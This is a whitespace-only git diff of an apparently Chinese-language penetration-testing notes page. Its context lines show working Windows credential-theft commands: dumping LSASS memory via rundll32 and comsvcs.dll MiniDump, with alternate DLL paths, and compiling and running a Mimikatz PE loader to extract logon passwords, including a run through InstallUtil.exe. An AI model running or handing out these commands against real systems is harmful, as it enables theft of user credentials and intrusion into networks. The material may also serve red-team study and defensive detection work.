@@ -392,9 +392,9 @@ windows/meterpreter/reversehttps
 </li>
 <li>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell -c <span style="color:#e6db74">&#34;rundll32 C:\windows\system32\comsvcs.dll, MiniDump 808 C:\test\lsass.dmp full&#34;</span>
-        
+
 其中comsvcs.dll可以替换为以下dll<span style="color:#960050;background-color:#1e0010">：</span>
-        
+
 C:\Windows\Syswow64\comsvcs.dll
 C:\Windows\winsxs\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_6.1.7600.16385_none_ceb756d4b98f01a4\comsvcs.dll
 C:\Windows\winsxs\x86_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_6.1.7600.16385_none_7298bb510131906e\comsvcs.dll
@@ -445,10 +445,10 @@ $Path = <span style="color:#e6db74">&#39;C:\Windows&#39;</span>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe PELoaderofMimikatz.cs /unsafe
 or
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe PELoaderofMimikatz.cs /unsafe
-      
+
 <span style="color:#75715e"># 导出的命令</span>
 PELoaderofMimikatz.exe log <span style="color:#e6db74">&#34;privilege::debug&#34;</span> <span style="color:#e6db74">&#34;sekurlsa::logonPasswords full&#34;</span> exit
-      
+
 <span style="color:#75715e">#使用InstallUtil.exe导出凭据</span>
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U PELoaderofMimikatzAuto.exe
 </code></pre></div></li>
